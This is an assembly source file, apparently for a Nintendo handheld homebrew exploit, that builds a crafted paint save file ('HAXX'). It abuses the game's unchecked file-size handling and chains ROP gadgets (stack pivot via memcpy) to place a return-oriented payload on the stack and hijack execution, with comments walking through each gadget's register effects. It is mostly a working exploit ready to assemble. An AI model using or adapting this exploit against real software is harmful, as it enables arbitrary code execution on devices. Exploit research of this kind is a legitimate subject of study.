.nds

.include "paint_constants.s"
;.include "paint_macros.s"

.create "../build/HAXX", PAINT_FILE_BUFFER

.ascii "PXI", 0 ; MAGICVAL, kind of useless because it is not checked before the whole file is read
.halfword (end-start)/(3*4) ; height/width, each pixel is 3 bytes long, size is too big to be halfword so divide by 4 and set width/height to 4
.halfword 0x4 ; game copy height*width*3 bytes (pixel is 3 bytes long), since we divide le previous one by 4, we set this one to 4

start:

.orga 0x10
.incbin "../build/rop_stage1.bin"


.orga 0x49348 ; will be memcpy source, no choice
memcpy_source:

.orga 0x49348+0x8 ; r4 points to PAINT_FILE_BUFFER+0x49348
	.word PAINT_PIVOT_THIRD ; allow to set r0(memcpy dest) and r2(memcpy size)
													; ldr r3, [r0, #0x14]! => r3=*(PAINT_FILE_BUFFER+0x49348+0x20)=PAINT_MEMCPY / r0=PAINT_FILE_BUFFER+0x49348+0x20
													; ldr r2, [r0, #0x8]   => r2=*(PAINT_FILE_BUFFER+0x49348+0x28)=rop_end-rop_start set memcpy size
													; mov r0, sp           => set memcpy dest to current stack
													; blx r3 							 => do mempcy, but do not jump to our rop because it does bx lr, so the following instructions are executed
													;													our goal is now to set lr and then bx lr, fortunately the following intructions are perfect to fdo so :)
													; add sp, sp, #0x14    => increment sp, it's good because then we can just pop LR, if this wasn't done, a previously used address would be located where lr would be popped
													; mov r0, r4           => used later, r0=PAINT_FILE_BUFFER+0x49348
													; pop {r4-r7, lr}			 => thanks to add sp, this pop ROP_PAINT_POP_R4PC to lr
													; ... (branch)
													; ldr r1, [r0, #0x8]   => r1=PAINT_PIVOT_THIRD
													; subs r1, r1, #1			 => since r1=PAINT_PIVOT_THIRD, r1!=0 so it branches later
													; str r1, [r0, #0x8]   => don't care
													; bne to bx lr				 => if r1!=0 bx lr
													;													so it jumps to ROP_PAINT_POP_R4PC, we need to pop r4 too because, when it bx lr, sp points to where the memcpy size is located

	.word PAINT_FILE_BUFFER+0x49348+0x4
	.word PAINT_FILE_BUFFER+0x49348+0x10
	.word PAINT_PIVOT_SECOND ; allow to set r1, the memcpy source
													 ; ldr r2, [r5]       => r2=*(PAINT_FILE_BUFFER+0x49348+0xC)=PAINT_FILE_BUFFER+0x49348+0x4 used to jump at the end
													 ; mov r1, r4         => r1=PAINT_FILE_BUFFER+0x49348 set the source arg for memcpy
													 ; mov r0, r5         => r0=PAINT_FILE_BUFFER+0x49348+0xC used by next gadget to jump to memcpy
													 ; ldr r2, [r2, #0x4] => r2=PAINT_PIVOT_THIRD
													 ; blx r2             => jump to the next gadget
	.word 0x0
	.word 0x0
	.word PAINT_MEMCPY
	.word ROP_PAINT_POP_R4PC
	.word rop_end-memcpy_source ; memcpy size, from memcpy_source to the end of the rop

rop_start:
.area (0x494A8+PAINT_FILE_BUFFER)-.

.incbin "../build/rop_stage0.bin"

.endarea
rop_end:

.fill (0x494A4+PAINT_FILE_BUFFER)-., 0xFF

.orga 0x494A4
	.word PAINT_PIVOT_FIRST ; game jumps there, only r4 points to a controlled buffer r4=PAINT_FILE_BUFFER+0x49348
													; our goal is to do a memcpy of our rop overthe current stack, because there's no gadget to stack_pivot
													; with this gadget we set r5 to point to our controlled buffer, we will then be able to ldr from r5 (not many ldr from r4)
													; ldr r0, [r4, #0x10] => r0=*(PAINT_FILE_BUFFER+0x49348+0x10)=PAINT_FILE_BUFFER+0x49348+0x10
													; add r5, r4, #0xC    => r5=PAINT_FILE_BUFFER+0x49348+0xC
													; ... (branch + condition r0!= 0)
													; ldr r1, [r0]        => r1=PAINT_FILE_BUFFER+0x49348+0x10
													; ldr r1, [r1, #0x4]  => r1=PAINT_PIVOT_SECOND
													; bx r1               => branch to second gadget

.fill 11, 0x0 ; ensure that the game will not try to read out of bounds, since we divide by 12 but we're not sure the size is actually a multiple of 12
							; since we do an integer division if the size is not a multiple of 12 then the result is rounded down and everything may not be properly copied
							; so we add 11 zero bytes, so even if the size is not a mulitple of 12, the missing bytes are part of these 11 useless zeros

end:

.word 0x0

.close
